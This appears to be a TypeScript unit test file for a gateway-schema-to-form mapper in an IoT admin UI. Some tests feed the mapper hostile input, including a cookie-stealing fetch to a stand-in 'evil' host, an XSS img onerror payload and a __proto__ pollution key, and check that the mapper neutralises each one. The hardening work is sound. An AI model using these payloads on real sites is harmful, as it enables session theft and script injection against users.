// SPDX-FileCopyrightText: Copyright The Inferrix Authors
// SPDX-License-Identifier: Apache-2.0
import { FormPropertyType } from '@shared/models/dynamic-form.models';
import {
  GatewaySchemaDocument,
  SCHEMA_MAX_DEPTH,
  SCHEMA_MAX_PROPERTIES,
  schemaToFormProperties
} from '@shared/models/inferrix-gateway-schema.models';
import fixture from './inferrix-gateway-schema.fixture.json';

/**
 * The gateway's schema document is the least trusted input in this feature.
 *
 * It arrives from a device on a LAN, it is rendered into a tenant administrator's browser, and
 * ThingsBoard's own form renderer compiles `condition` to executable JavaScript. Everything here
 * treats the schema as hostile.
 *
 * The fixture is a real swagger-generated document produced from the stack's own model classes
 * through the same `ModelConverters` call `ModelSchemaService` makes — not hand-written, because a
 * hand-written one tests the mapper against our own assumptions instead of against the gateway.
 *
 * Its four **family keys** were hand-written, and every one of the three that could be wrong was:
 * the locator family was keyed `MODBUS_IP.PL`, which does not exist on any build (`MODBUS_IP.DS`
 * takes `MODBUS.PL`), and the detector and handler families were keyed `BINARY_STATE` and `EMAIL`
 * rather than `BINARY_STATE_DETECTOR` and `EMAIL_HANDLER`. `ModelSchemaService` keys each family by
 * its mapping's `getTypeName()`, which returns the definition's `TYPE_NAME` constant, so those
 * three are now what the stack's own constants say and what a live gateway returns.
 */
describe('inferrix-gateway-schema.models', () => {

  const doc = fixture as unknown as GatewaySchemaDocument;

  describe('against the real gateway document', () => {

    it('renders a data source schema the stack actually produces', () => {
      const properties = schemaToFormProperties(doc, 'dataSource', 'MODBUS_IP.DS');

      expect(properties.length).toBeGreaterThan(5);
      // Scalars the fixture really carries, with the OpenAPI formats swagger emits.
      const timeout = properties.find(p => p.id === 'timeout');
      expect(timeout.type).toBe(FormPropertyType.number);
      expect(properties.find(p => p.id === 'enabled').type).toBe(FormPropertyType.switch);
      expect(properties.find(p => p.id === 'editPermission').type).toBe(FormPropertyType.text);
    });

    it("renders a point's locator form from the locator family", () => {
      // The form a point actually needs. A data point carries a nested pointLocator whose concrete
      // type is decided by the data source's protocol, so the locator form is not a slice of the
      // point schema, it is its own family entry. The pairing is not a rename of the data source
      // type: MODBUS_IP.DS takes MODBUS.PL, and no MODBUS_IP.PL exists.
      const locator = schemaToFormProperties(doc, 'pointLocator', 'MODBUS.PL');

      expect(locator.length).toBeGreaterThan(5);
      // The fields that decide what the point reads off the wire.
      expect(locator.find(p => p.id === 'offset').type).toBe(FormPropertyType.number);
      expect(locator.find(p => p.id === 'slaveId').type).toBe(FormPropertyType.number);
      expect(locator.find(p => p.id === 'settable').type).toBe(FormPropertyType.switch);
      // Enums become a select whose options come from the schema, not from a table here.
      const dataType = locator.find(p => p.id === 'dataType');
      expect(dataType.type).toBe(FormPropertyType.select);
      expect(dataType.items.map(item => item.value)).toContain('NUMERIC');
      const range = locator.find(p => p.id === 'range');
      expect(range.type).toBe(FormPropertyType.select);
      expect(range.items.length).toBeGreaterThan(1);

      // The generic base type is present too, and carries only what every locator shares -- which
      // is why the form has to be built from the concrete type and not from this one.
      const base = schemaToFormProperties(doc, 'pointLocator', 'MODBUS.PL');
      expect(base.length).toBe(locator.length);
      expect(schemaToFormProperties(doc, 'pointLocator', 'NOT_A_PROTOCOL.PL')).toEqual([]);
    });

    it('resolves $ref into components.schemas', () => {
      // Not an edge case: the fixture carries 48 $refs, and every data point has a text renderer.
      // A mapper that skipped refs would render most of this feature as empty forms.
      const properties = schemaToFormProperties(doc, 'dataSource', 'MODBUS_IP.DS');
      const purgePeriod = properties.find(p => p.id === 'purgePeriod');

      expect(purgePeriod.type).toBe(FormPropertyType.fieldset);
      expect(purgePeriod.properties.length).toBeGreaterThan(0);
    });

    it('renders every family in the document without throwing', () => {
      for (const [family, types] of Object.entries(doc.families)) {
        for (const type of Object.keys(types)) {
          const properties = schemaToFormProperties(doc, family, type);
          expect(properties).withContext(`${family}/${type}`).toBeTruthy();
        }
      }
    });

    it('merges allOf, which is how the stack expresses inheritance', () => {
      // swagger emits `allOf: [{$ref: Base}, {properties: ...}]` for a subclass. Ignoring allOf
      // would silently drop every inherited field -- the fixture has 8 of them.
      const properties = schemaToFormProperties(doc, 'eventHandler', 'EMAIL_HANDLER');
      expect(properties.length).toBeGreaterThan(1);
    });
  });

  describe('as hostile input', () => {

    it('never emits a condition, whatever the schema says', () => {
      // FormProperty.condition is compiled to executable JavaScript by TB's own renderer. The
      // gateway sends none today; this pins the contract, so a future stack version adding one
      // cannot silently become code execution in a tenant admin's browser.
      const hostile: GatewaySchemaDocument = {
        families: {dataSource: {EVIL: {
          type: 'object',
          properties: {
            a: {type: 'string', condition: 'fetch("//evil/"+document.cookie)'} as any,
            b: {type: 'string', conditionFunction: 'alert(1)'} as any
          }
        }}},
        components: {schemas: {}}
      };
      for (const property of schemaToFormProperties(hostile, 'dataSource', 'EVIL')) {
        expect(property.condition).toBeUndefined();
        expect(property.conditionFunction).toBeUndefined();
      }
    });

    it('degrades an unknown type to text rather than passing it through', () => {
      const hostile: GatewaySchemaDocument = {
        families: {dataSource: {EVIL: {
          type: 'object',
          properties: {
            a: {type: 'javascript'} as any,
            b: {type: 'html'} as any,
            c: {type: 'not-a-type'} as any
          }
        }}},
        components: {schemas: {}}
      };
      // javascript/html/markdown are real FormPropertyTypes that render executable or markup
      // content. A gateway naming one must not get it.
      for (const property of schemaToFormProperties(hostile, 'dataSource', 'EVIL')) {
        expect(property.type).toBe(FormPropertyType.text);
      }
    });

    it('escapes every string it takes from the schema', () => {
      const payload = '<img src=x onerror=alert(1)>';
      const hostile: GatewaySchemaDocument = {
        families: {dataSource: {EVIL: {
          type: 'object',
          properties: {
            [payload]: {type: 'string'},
            described: {type: 'string', description: payload},
            choice: {type: 'string', enum: [payload]}
          }
        }}},
        components: {schemas: {}}
      };
      const properties = schemaToFormProperties(hostile, 'dataSource', 'EVIL');
      const rendered = JSON.stringify(properties);

      expect(rendered).not.toContain('<img');
      // The description is escaped -- it is free text and the gateway is entitled to send any.
      expect(rendered).toContain('&lt;img');
      // The property NAME is not escaped, it is refused: a name is an identifier, and the mapper
      // has no legitimate use for one that is not. Nothing is lost by dropping it, because a field
      // the gateway named with markup is a field no model actually has.
      expect(properties.map(p => p.id)).toEqual(['described', 'choice']);

      // A select option's VALUE is submitted back to the gateway verbatim, so escaping it would
      // corrupt legitimate data -- a value containing "&" would be sent as "&amp;". It is
      // therefore the one string that would reach the form model unescaped, and the answer is to
      // refuse it rather than sanitise it: these are Java enum names, so markup is not a value the
      // stack can have produced. All options refused leaves a text field, not a dead select.
      const choice = properties.find(p => p.id === 'choice');
      expect(choice.type).toBe(FormPropertyType.text);
      expect(choice.items).toBeUndefined();
    });

    it('caps depth rather than following a schema down forever', () => {
      let nested: any = {type: 'string'};
      for (let i = 0; i < SCHEMA_MAX_DEPTH + 5; i++) {
        nested = {type: 'object', properties: {child: nested}};
      }
      const deep: GatewaySchemaDocument = {
        families: {dataSource: {DEEP: nested}}, components: {schemas: {}}
      };

      let depth = 0;
      let cursor = schemaToFormProperties(deep, 'dataSource', 'DEEP')[0];
      while (cursor?.properties?.length) {
        depth++;
        cursor = cursor.properties[0];
      }
      expect(depth).toBeLessThanOrEqual(SCHEMA_MAX_DEPTH);
    });

    it('caps how many properties one schema can contribute', () => {
      const properties: {[key: string]: any} = {};
      for (let i = 0; i < SCHEMA_MAX_PROPERTIES + 50; i++) {
        properties['field' + i] = {type: 'string'};
      }
      const huge: GatewaySchemaDocument = {
        families: {dataSource: {HUGE: {type: 'object', properties}}}, components: {schemas: {}}
      };
      expect(schemaToFormProperties(huge, 'dataSource', 'HUGE').length)
        .toBeLessThanOrEqual(SCHEMA_MAX_PROPERTIES);
    });

    it('terminates on a cyclic $ref instead of hanging the browser', () => {
      // The shared-components layout makes A -> B -> A easy to reach, and a gateway does not have
      // to be malicious to serve one.
      const cyclic: GatewaySchemaDocument = {
        families: {dataSource: {CYCLE: {type: 'object', properties: {a: {$ref: '#/components/schemas/A'}}}}},
        components: {schemas: {
          A: {type: 'object', properties: {b: {$ref: '#/components/schemas/B'}}},
          B: {type: 'object', properties: {a: {$ref: '#/components/schemas/A'}}}
        }}
      };
      expect(() => schemaToFormProperties(cyclic, 'dataSource', 'CYCLE')).not.toThrow();
    });

    it('turns a missing $ref into a disabled placeholder rather than throwing', () => {
      // One bad ref must not blank the whole form -- the operator loses one field, not the page.
      const broken: GatewaySchemaDocument = {
        families: {dataSource: {BROKEN: {type: 'object', properties: {
          good: {type: 'string'},
          bad: {$ref: '#/components/schemas/Missing'}
        }}}},
        components: {schemas: {}}
      };
      const properties = schemaToFormProperties(broken, 'dataSource', 'BROKEN');

      expect(properties.length).toBe(2);
      expect(properties.find(p => p.id === 'good')).toBeTruthy();
      expect(properties.find(p => p.id === 'bad').disabled).toBeTrue();
    });

    it('answers with nothing for a family or type it does not have', () => {
      expect(schemaToFormProperties(doc, 'nope', 'MODBUS_IP.DS')).toEqual([]);
      expect(schemaToFormProperties(doc, 'dataSource', 'NOPE')).toEqual([]);
      expect(schemaToFormProperties(null, 'dataSource', 'X')).toEqual([]);
    });
  });

  describe('the type mapping', () => {

    const mapped = (schema: any) => schemaToFormProperties(
      {families: {f: {t: {type: 'object', properties: {p: schema}}}}, components: {schemas: {}}},
      'f', 't')[0];

    it('maps each JSON Schema shape to its expected FormPropertyType', () => {
      expect(mapped({type: 'string'}).type).toBe(FormPropertyType.text);
      expect(mapped({type: 'boolean'}).type).toBe(FormPropertyType.switch);
      expect(mapped({type: 'integer', format: 'int32'}).type).toBe(FormPropertyType.number);
      expect(mapped({type: 'number', format: 'double'}).type).toBe(FormPropertyType.number);
      expect(mapped({type: 'string', enum: ['A', 'B']}).type).toBe(FormPropertyType.select);
      // Real stack enum constants survive untouched, values and all.
      const choices = mapped({type: 'string', enum: ['DO_NOT_ALLOW', 'ALLOW']});
      expect(choices.items.map(i => i.value)).toEqual(['DO_NOT_ALLOW', 'ALLOW']);
      expect(mapped({type: 'integer', enum: [1, 2]}).items.map(i => i.value)).toEqual([1, 2]);
      expect(mapped({type: 'string', format: 'date-time'}).type).toBe(FormPropertyType.datetime);
      expect(mapped({type: 'array', items: {type: 'string'}}).type).toBe(FormPropertyType.array);
      expect(mapped({type: 'object', properties: {x: {type: 'string'}}}).type)
        .toBe(FormPropertyType.fieldset);
    });

    it('carries integer bounds through as number bounds', () => {
      const bounded = mapped({type: 'integer', minimum: 1, maximum: 65535});
      expect(bounded.min).toBe(1);
      expect(bounded.max).toBe(65535);
    });

    it('names a secret-looking field a password so it is not shoulder-read', () => {
      expect(mapped({type: 'string', format: 'password'}).type).toBe(FormPropertyType.password);
    });

    it('humanises property names, because A1 ships no labels', () => {
      // The gateway sends no i18n labels and no help text. Blocking on a dictionary lookup that
      // will never answer would leave every form showing raw identifiers.
      expect(mapped({type: 'string'}).name).toBe('P');
      const doc2: GatewaySchemaDocument = {
        families: {f: {t: {type: 'object', properties: {
          userPassword: {type: 'string'}, maxReadBitCount: {type: 'integer'}, xid: {type: 'string'}
        }}}}, components: {schemas: {}}
      };
      const named = schemaToFormProperties(doc2, 'f', 't');
      expect(named.find(p => p.id === 'userPassword').name).toBe('User password');
      expect(named.find(p => p.id === 'maxReadBitCount').name).toBe('Max read bit count');
      expect(named.find(p => p.id === 'xid').name).toBe('Xid');
    });

    it('renders a MessageTranslation as read-only text, not as its declared object', () => {
      // The schema says {key, args} because that is the Java class swagger introspected. The
      // gateway's Jackson module registers a serializer only, which writes translate(...) -- so a
      // plain string goes over the wire and a form built from the schema would offer two inputs
      // for one line of text. Read-only because the same asymmetry runs the other way: with no
      // deserializer a string written back becomes the KEY, and an unknown key reads back as
      // "???text(en)???" rather than as itself.
      const description = schemaToFormProperties(doc, 'dataSource', 'MODBUS_IP.DS')
        .find(p => p.id === 'description');
      expect(description.type).toBe(FormPropertyType.text);
      expect(description.disabled).toBeTrue();
      expect((description as any).properties).toBeUndefined();

      // Same field on an event detector, which is where G5 meets it.
      const detector = schemaToFormProperties(doc, 'eventDetector', 'BINARY_STATE_DETECTOR')
        .find(p => p.id === 'description');
      expect(detector.type).toBe(FormPropertyType.text);
      expect(detector.disabled).toBeTrue();
    });

    it('carries an object array\'s item fields up onto the array', () => {
      // TB builds each array row by cloning the ARRAY property and swapping its type for
      // arrayItemType, so a fieldset row renders whatever `properties` sits on the array. Without
      // them the row has no inputs, and because the renderer writes its value back over the whole
      // array, saving the form would reduce every item to nothing.
      const handler = schemaToFormProperties(doc, 'eventHandler', 'EMAIL_HANDLER');
      const eventTypes = handler.find(p => p.id === 'eventTypes');
      expect(eventTypes.type).toBe(FormPropertyType.array);
      expect(eventTypes.arrayItemType).toBe(FormPropertyType.fieldset);
      expect((eventTypes as any).properties.map(p => p.id))
        .toEqual(['eventType', 'subType', 'referenceId1', 'referenceId2']);

      // An array of scalars keeps its scalar item type and needs no properties.
      const detector = schemaToFormProperties(doc, 'eventDetector', 'BINARY_STATE_DETECTOR');
      const handlerXids = detector.find(p => p.id === 'handlerXids');
      expect(handlerXids.type).toBe(FormPropertyType.array);
      expect(handlerXids.arrayItemType).toBe(FormPropertyType.text);
      expect((handlerXids as any).properties).toBeUndefined();
    });

    it('refuses __proto__ as a property name', () => {
      // JSON.parse makes "__proto__" a real own property, so a gateway can put one in its schema
      // and in the model beside it. Assigning that id onto a value object walks the prototype
      // setter instead of adding a key -- the field the operator can see silently does not exist,
      // and the object it was meant to land in acquires a prototype of the gateway's choosing.
      //
      // "constructor" and "prototype" are here to pin that they are NOT refused: as keys on a
      // plain object they are ordinary own properties with no special behaviour, and refusing a
      // name the stack could legitimately use costs a field for nothing.
      const hostile = schemaToFormProperties({
        families: {f: {t: {type: 'object', properties: JSON.parse(
          '{"__proto__": {"type": "string"}, "constructor": {"type": "string"},'
          + ' "prototype": {"type": "string"}, "timeout": {"type": "integer"}}')}}},
        components: {schemas: {}}
      }, 'f', 't');
      expect(hostile.map(p => p.id)).toEqual(['constructor', 'prototype', 'timeout']);
    });

    it('marks required fields from the parent required array', () => {
      const required = schemaToFormProperties(
        {families: {f: {t: {type: 'object', required: ['a'],
          properties: {a: {type: 'string'}, b: {type: 'string'}}}}}, components: {schemas: {}}},
        'f', 't');
      expect(required.find(p => p.id === 'a').required).toBeTrue();
      expect(required.find(p => p.id === 'b').required).toBeFalsy();
    });
  });
});
